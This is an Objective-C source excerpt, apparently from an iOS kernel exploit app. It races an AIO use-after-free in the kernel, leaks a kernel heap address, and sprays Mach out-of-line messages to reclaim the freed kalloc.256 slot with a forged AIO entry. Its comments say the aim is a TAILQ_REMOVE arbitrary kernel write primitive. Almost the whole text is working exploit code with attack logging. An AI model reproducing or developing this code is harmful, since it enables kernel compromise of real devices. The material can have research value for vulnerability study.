...
//
// Phase A: Confirm ext[1] control via reclaim aio_nbytes + leak kernel heap addr.
// Phase B: Test zone sharing — replace aio_read reclaim with mach OOL spray.
//   If AIO zone shares kalloc.256, OOL spray controls fake entry content,
//   enabling TAILQ_REMOVE *(tqe_prev)=tqe_next arbitrary write primitive.
...
- (void)aioUafTapped {
    ...
    // ident field leaks a kernel heap address (AIO entry location).
    ...
    // ---- Phase B: OOL spray to test zone sharing ----
    // If AIO zone (KT_DEFAULT) shares kalloc.256 with general allocator,
    // we can replace aio_read reclaim with mach OOL spray to control entry content.
    // This would enable TAILQ_REMOVE arbitrary write via forged aio_proc_link.
    //
    // Strategy: after trigger free, spray kalloc.256 via mach OOL instead of aio_read.
    // If ext values show our OOL signature, zone is shared => full control.
    // To avoid procp=0 panic, we use the leaked kernel addr as a heuristic procp.

    [self appendLog:@"\n--- Phase B: OOL spray zone sharing test ---"];

    if (self.leakedKernelAddr == 0) {
        [self appendLog:@"  SKIP: no kernel addr leaked from Phase A"];
    } else {
        // Setup mach port for OOL spray
        mach_port_t sprayPort = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayPort) != KERN_SUCCESS) {
            [self appendLog:@"  FAIL: mach_port_allocate"];
            close(fd);
        ...
        // OOL payload size: AIO entry is ~224 bytes → kalloc.256 bucket.
        // Payload of 224-240 bytes with MACH_MSG_PHYSICAL_COPY allocates from kalloc.256.
        enum { kOolAioSize = 232, kOolAioSprayCount = 160 };
        uint8_t *oolPayload = (uint8_t *)calloc(1, kOolAioSize);
        if (!oolPayload) {
            [self appendLog:@"  FAIL: calloc OOL payload"];
            mach_port_destroy(mach_task_self_, sprayPort);
            close(fd);
            unlink(path.UTF8String);
            return;
        ...
        // Build a minimal fake AIO entry in OOL payload.
        // Offsets (from README): +0x10=aio_proc_link, +0x20=returnval, +0x28=errorval, +0x2C=refcount, +0x40=procp
        // Place signature values at known leak offsets:
        uint64_t sigReturnval = 0xBEEF0001DEAD0001ULL;  // at +0x20
        uint32_t sigErrorval  = 0xC0DE0002;              // at +0x28
        uint64_t sigTqeNext   = 0x0;                     // at +0x10 (NULL = end of queue, safe)
        uint64_t sigTqePrev   = 0x0;                     // at +0x18
        uint64_t fakeProcp    = self.leakedKernelAddr;   // at +0x40 (heuristic: use leaked addr)

        memset(oolPayload, 0, kOolAioSize);
        memcpy(oolPayload + 0x10, &sigTqeNext, 8);
        memcpy(oolPayload + 0x18, &sigTqePrev, 8);
        memcpy(oolPayload + 0x20, &sigReturnval, 8);
        memcpy(oolPayload + 0x28, &sigErrorval, 4);
        memcpy(oolPayload + 0x40, &fakeProcp, 8);

        [self appendLog:[NSString stringWithFormat:@"  OOL payload: %dB→kalloc.256, returnval=0x%llx errorval=0x%x fakeProcp=0x%llx",
                         kOolAioSize, sigReturnval, sigErrorval, fakeProcp]];

        // Pre-fill spray port queue (default limit: 5 messages)
        typedef struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t ool;
        } OOLAioMsg;
        // OOLAioMsg must fit kalloc.64 (<=64 bytes)
        ...
        for (int i = 0; i < 5; i++) {
            ...
            memset(&msg, 0, sizeof(msg));
            msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
            msg.header.msgh_size = sizeof(OOLAioMsg);
            msg.header.msgh_remote_port = sprayPort;
            msg.header.msgh_id = (mach_msg_id_t)i;
            msg.body.msgh_descriptor_count = 1;
            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
            msg.ool.address = oolPayload;
            msg.ool.size = kOolAioSize;
            msg.ool.deallocate = FALSE;
            msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
            if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
                prefill++;
        ...
        [self appendLog:[NSString stringWithFormat:@"  Spray port pre-filled: %d/5 msgs", prefill]];

        // Phase B attack: no aio_read reclaim, only OOL spray
        for (int attempt = 0; attempt < 5; attempt++) {
            [self appendLog:[NSString stringWithFormat:@"Phase B attempt %d", attempt]];

            int kq = kqueue();
            if (kq < 0) { [self appendLog:@"  kqueue failed"]; continue; }

            static struct aiocb b_tcb;
            static char b_tbuf[4096];
            memset(&b_tcb, 0, sizeof(b_tcb));
            b_tcb.aio_fildes = fd;
            b_tcb.aio_buf = b_tbuf;
            b_tcb.aio_nbytes = sizeof(b_tbuf);
            b_tcb.aio_offset = 0;
            b_tcb.aio_lio_opcode = LIO_READ;
            b_tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
            b_tcb.aio_sigevent.sigev_signo = kq;
            b_tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xBB;

            // Racer: only FREE, no reclaim (NULL rcbs means skip reclaim)
            struct aio_race_state brs = {};
            brs.trigger = &b_tcb;
            brs.rcbs = NULL;  // signal to racer: skip reclaim
            brs.nrcbs = 0;

            pthread_t bthr;
            pthread_create(&bthr, NULL, aio_free_and_reclaim_racer, &brs);
            atomic_store_explicit(&brs.start, true, memory_order_release);

            // Submit trigger
            struct aiocb *bptr = &b_tcb;
            struct sigevent bsig = {};
            bsig.sigev_notify = SIGEV_NONE;
            lio_listio(LIO_NOWAIT, &bptr, 1, &bsig);

            // Wait for trigger to complete + be freed by racer
            usleep(800);

            // Immediately spray OOL to reclaim the freed AIO slot
            // Send-then-recv cycle: send gets freed slot (LIFO), recv frees to make room
            for (int s = 0; s < kOolAioSprayCount; s++) {
                OOLAioMsg smsg;
                memset(&smsg, 0, sizeof(smsg));
                smsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                smsg.header.msgh_size = sizeof(OOLAioMsg);
                smsg.header.msgh_remote_port = sprayPort;
                smsg.header.msgh_id = (mach_msg_id_t)(1000 + s);
                smsg.body.msgh_descriptor_count = 1;
                smsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
                smsg.ool.address = oolPayload;
                smsg.ool.size = kOolAioSize;
                smsg.ool.deallocate = FALSE;
                smsg.ool.copy = MACH_MSG_PHYSICAL_COPY;
                mach_msg(&smsg.header, MACH_SEND_MSG, sizeof(smsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);

                // Drain one message to keep queue below limit
                OOLAioMsg rmsg;
                memset(&rmsg, 0, sizeof(rmsg));
                mach_msg(&rmsg.header, MACH_RCV_MSG, 0, sizeof(rmsg), sprayPort, 0, MACH_PORT_NULL);
            }

            atomic_store_explicit(&brs.stop, true, memory_order_release);
            pthread_join(bthr, NULL);

            int bfreed = atomic_load(&brs.freed);
            if (bfreed == 0) {
                while (aio_error(&b_tcb) == EINPROGRESS) usleep(500);
                aio_return(&b_tcb);
                close(kq);
                [self appendLog:@"  Phase B race lost, retrying"];
                continue;
            }

            [self appendLog:[NSString stringWithFormat:@"  Phase B freed=%d, OOL sprayed %d msgs", bfreed, kOolAioSprayCount]];

            // kevent64 will process the (now OOL-sprayed) entry
            struct kevent64_s bkev = {};
            struct timespec bts = {10, 0};
            int bnev = kevent64(kq, NULL, 0, &bkev, 1, 0, &bts);

            if (bnev > 0) {
                [self appendLog:@"*** PHASE B: EVENT RECEIVED ***"];
                [self appendLog:[NSString stringWithFormat:@"  ident  = 0x%llx", bkev.ident]];
                [self appendLog:[NSString stringWithFormat:@"  ext[0] = 0x%llx (expected 0x%x)", bkev.ext[0], sigErrorval]];
                [self appendLog:[NSString stringWithFormat:@"  ext[1] = 0x%llx (expected 0x%llx)", bkev.ext[1], sigReturnval]];
                [self appendLog:[NSString stringWithFormat:@"  udata  = 0x%llx", bkev.udata]];

                if (bkev.ext[1] == sigReturnval) {
                    [self appendLog:@"  *** ZONE SHARING CONFIRMED: OOL spray controls ext[1] ***"];
                    [self appendLog:@"  *** TAILQ_REMOVE arbitrary write primitive ENABLED ***"];
                } else if (bkev.ext[1] == 0 && bkev.ext[0] == 0) {
                    [self appendLog:@"  >> ext values are 0 — slot was zeroed (OOL spray missed) <<"];
                    [self appendLog:@"  >> Zone may be type-dedicated, or timing needs tuning <<"];
                } else {
                    [self appendLog:@"  >> OOL spray partially affected values — zone likely shared <<"];
                }
                break;
            } else {
                [self appendLog:@"  kevent64 timeout — possibly panic avoided or knote lost"];
            }

            close(kq);
        }

        // Drain remaining spray messages
        OOLAioMsg drmsg;
        while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(drmsg), sprayPort, 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
        mach_port_destroy(mach_task_self_, sprayPort);
        free(oolPayload);
    }
